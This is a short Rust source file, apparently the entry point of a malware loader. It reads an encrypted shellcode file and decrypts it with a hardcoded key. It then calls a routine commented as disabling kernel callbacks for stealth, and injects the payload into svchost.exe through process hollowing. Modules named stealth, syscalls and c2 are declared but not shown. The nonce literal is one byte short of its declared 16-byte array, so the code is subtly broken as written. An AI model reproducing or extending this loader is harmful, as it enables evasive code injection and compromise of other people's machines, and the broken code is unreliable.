mod hollowing;
mod encryption;
mod syscalls;
mod stealth;
mod c2;

use std::fs;
use std::process::exit;

fn main() {
    // Fetch Encrypted Shellcode
    let shellcode = fs::read("shellcode/payload.bin").expect("Failed to read shellcode");

    let key: [u8; 16] = *b"mysecretkey12345";
    let nonce: [u8; 16] = *b"random_iv_nonce";

    let decrypted_shellcode = encryption::decrypt_shellcode(&shellcode, &key, &nonce);

    // Apply Kernel Stealth Before Execution
    stealth::disable_callbacks();

    // Process Hollowing (Inject into a new process)
    let target_process = "C:\\Windows\\System32\\svchost.exe";
    hollowing::hollow_process(target_process, &decrypted_shellcode);
    
    exit(0);
}
